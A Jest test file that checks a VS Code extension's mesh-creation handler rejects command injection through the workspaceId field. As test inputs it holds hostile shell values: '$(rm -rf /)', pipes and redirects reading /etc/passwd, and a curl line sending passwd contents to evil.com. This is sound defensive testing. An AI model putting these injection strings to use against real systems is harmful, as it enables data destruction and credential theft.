/**
 * Tests for create-api-mesh handler
 *
 * SECURITY TESTS (Step 2): Validates workspaceId parameter to prevent command injection
 */

import { handleCreateApiMesh } from '@/features/mesh/handlers/createHandler';
import { HandlerContext } from '@/commands/handlers/HandlerContext';
import { ServiceLocator } from '@/core/di';

// Mock dependencies
jest.mock('@/core/di');
jest.mock('vscode');
jest.mock('fs', () => ({
    promises: {
        mkdir: jest.fn().mockResolvedValue(undefined),
        writeFile: jest.fn().mockResolvedValue(undefined),
        readFile: jest.fn().mockResolvedValue('{"meshConfig":{"sources":[]}}'),
        rm: jest.fn().mockResolvedValue(undefined),
    },
}));

describe('createHandler - Security Tests (Step 2)', () => {
    let mockContext: HandlerContext;
    let mockCommandExecutor: any;
    let mockAuthService: any;

    beforeEach(() => {
        // Use fake timers to avoid real delays in polling
        jest.useFakeTimers();
        // Reset all mocks
        jest.clearAllMocks();

        // Mock authentication service
        mockAuthService = {
            isAuthenticated: jest.fn().mockResolvedValue(true),
        };

        // Mock command executor with complete mesh creation flow
        mockCommandExecutor = {
            execute: jest.fn()
                // First call: mesh create
                .mockResolvedValueOnce({
                    code: 0,
                    stdout: '{"meshId":"test-mesh-123","meshStatus":"deployed"}',
                    stderr: '',
                })
                // Second call: mesh get (for verification)
                .mockResolvedValue({
                    code: 0,
                    stdout: '{"meshId":"test-mesh-123","meshStatus":"deployed"}',
                    stderr: '',
                }),
        };

        // Mock ServiceLocator
        (ServiceLocator.getAuthenticationService as jest.Mock).mockReturnValue(mockAuthService);
        (ServiceLocator.getCommandExecutor as jest.Mock).mockReturnValue(mockCommandExecutor);

        // Mock handler context
        mockContext = {
            context: {
                globalStorageUri: {
                    fsPath: '/tmp/test-storage',
                },
                extensionPath: '/tmp/extension',
            } as any,
            logger: {
                info: jest.fn(),
                warn: jest.fn(),
                error: jest.fn(),
                debug: jest.fn(),
            } as any,
            debugLogger: {
                debug: jest.fn(),
            } as any,
            sharedState: {} as any,
        } as any;
    });

    afterEach(() => {
        jest.useRealTimers();
    });

    describe('WorkspaceId Validation (SECURITY)', () => {
        it('should accept valid UUID workspaceId', async () => {
            const validWorkspaceId = '12345678-1234-1234-1234-123456789abc';

            // Start async operation and advance timers concurrently
            const resultPromise = handleCreateApiMesh(mockContext, {
                workspaceId: validWorkspaceId,
            });
            await jest.advanceTimersByTimeAsync(60000); // Advance past polling
            const result = await resultPromise;

            // Should not throw validation error
            expect(result.success).toBeDefined();
        });

        it('should accept alphanumeric workspaceId with hyphens and underscores', async () => {
            const validWorkspaceId = 'workspace_123-abc';

            // Start async operation and advance timers concurrently
            const resultPromise = handleCreateApiMesh(mockContext, {
                workspaceId: validWorkspaceId,
            });
            await jest.advanceTimersByTimeAsync(60000); // Advance past polling
            const result = await resultPromise;

            // Should not throw validation error
            expect(result.success).toBeDefined();
        });

        it('should reject empty workspaceId', async () => {
            const result = await handleCreateApiMesh(mockContext, {
                workspaceId: '',
            });

            expect(result.success).toBe(false);
            expect(result.error).toMatch(/workspace.*id/i);
        });

        it('should block command injection via workspaceId $(rm -rf /)', async () => {
            const maliciousWorkspaceId = '$(rm -rf /)';

            const result = await handleCreateApiMesh(mockContext, {
                workspaceId: maliciousWorkspaceId,
            });

            expect(result.success).toBe(false);
            expect(result.error).toMatch(/invalid.*workspace.*id/i);
        });

        it('should block pipe operator in workspaceId', async () => {
            const maliciousWorkspaceId = 'workspace | cat /etc/passwd';

            const result = await handleCreateApiMesh(mockContext, {
                workspaceId: maliciousWorkspaceId,
            });

            expect(result.success).toBe(false);
            expect(result.error).toMatch(/invalid.*workspace.*id/i);
        });

        it('should block semicolon command separator in workspaceId', async () => {
            const maliciousWorkspaceId = 'workspace; whoami';

            const result = await handleCreateApiMesh(mockContext, {
                workspaceId: maliciousWorkspaceId,
            });

            expect(result.success).toBe(false);
            expect(result.error).toMatch(/invalid.*workspace.*id/i);
        });

        it('should block backtick command substitution in workspaceId', async () => {
            const maliciousWorkspaceId = 'workspace`id`123';

            const result = await handleCreateApiMesh(mockContext, {
                workspaceId: maliciousWorkspaceId,
            });

            expect(result.success).toBe(false);
            expect(result.error).toMatch(/invalid.*workspace.*id/i);
        });

        it('should block shell redirection in workspaceId', async () => {
            const maliciousWorkspaceId = 'workspace < /etc/passwd';

            const result = await handleCreateApiMesh(mockContext, {
                workspaceId: maliciousWorkspaceId,
            });

            expect(result.success).toBe(false);
            expect(result.error).toMatch(/invalid.*workspace.*id/i);
        });

        it('should block AND operator in workspaceId', async () => {
            const maliciousWorkspaceId = 'workspace && echo hacked';

            const result = await handleCreateApiMesh(mockContext, {
                workspaceId: maliciousWorkspaceId,
            });

            expect(result.success).toBe(false);
            expect(result.error).toMatch(/invalid.*workspace.*id/i);
        });

        it('should block OR operator in workspaceId', async () => {
            const maliciousWorkspaceId = 'workspace || echo hacked';

            const result = await handleCreateApiMesh(mockContext, {
                workspaceId: maliciousWorkspaceId,
            });

            expect(result.success).toBe(false);
            expect(result.error).toMatch(/invalid.*workspace.*id/i);
        });
    });

    describe('Shell Parameter Usage', () => {
        it('should use shell parameter when executing mesh create command', async () => {
            const validWorkspaceId = 'workspace-123';

            // Start async operation and advance timers concurrently
            const resultPromise = handleCreateApiMesh(mockContext, {
                workspaceId: validWorkspaceId,
            });
            await jest.advanceTimersByTimeAsync(60000);
            await resultPromise;

            // Check that execute() was called
            expect(mockCommandExecutor.execute).toHaveBeenCalled();

            // Verify options include proper shell configuration
            const callOptions = mockCommandExecutor.execute.mock.calls[0][1];
            expect(callOptions).toBeDefined();
        });

        it('should validate workspaceId before executing mesh update command', async () => {
            // This test verifies security without running the full handler flow
            const maliciousWorkspaceId = '$(rm -rf /)';

            const result = await handleCreateApiMesh(mockContext, {
                workspaceId: maliciousWorkspaceId,
            });

            // Validation should fail before any commands are executed
            expect(result.success).toBe(false);
            expect(result.error).toMatch(/invalid.*workspace.*id/i);
            expect(mockCommandExecutor.execute).not.toHaveBeenCalled();
        });
    });

    describe('Error Handling', () => {
        it('should handle authentication failure gracefully', async () => {
            mockAuthService.isAuthenticated.mockResolvedValue(false);

            const result = await handleCreateApiMesh(mockContext, {
                workspaceId: 'workspace-123',
            });

            expect(result.success).toBe(false);
            expect(result.error).toMatch(/authentication required/i);
        });

        it('should not execute commands if workspaceId validation fails', async () => {
            const maliciousWorkspaceId = '$(rm -rf /)';

            await handleCreateApiMesh(mockContext, {
                workspaceId: maliciousWorkspaceId,
            });

            // Should NOT call execute if validation fails
            expect(mockCommandExecutor.execute).not.toHaveBeenCalled();
        });

        it('should prevent execution of malicious commands via workspaceId', async () => {
            const maliciousWorkspaceId = 'workspace; curl http://evil.com/steal?data=$(cat /etc/passwd)';

            const result = await handleCreateApiMesh(mockContext, {
                workspaceId: maliciousWorkspaceId,
            });

            expect(result.success).toBe(false);
            expect(mockCommandExecutor.execute).not.toHaveBeenCalled();
        });
    });

    describe('Path Parameter Safety', () => {
        it('should properly quote meshConfigPath to prevent injection', async () => {
            const validWorkspaceId = 'workspace-123';

            // Start async operation and advance timers concurrently
            const resultPromise = handleCreateApiMesh(mockContext, {
                workspaceId: validWorkspaceId,
            });
            await jest.advanceTimersByTimeAsync(60000);
            await resultPromise;

            // Check that command uses quoted path
            const commandString = mockCommandExecutor.execute.mock.calls[0][0];
            expect(commandString).toMatch(/"[^"]+mesh-config[^"]+\.json"/);
        });
    });
});
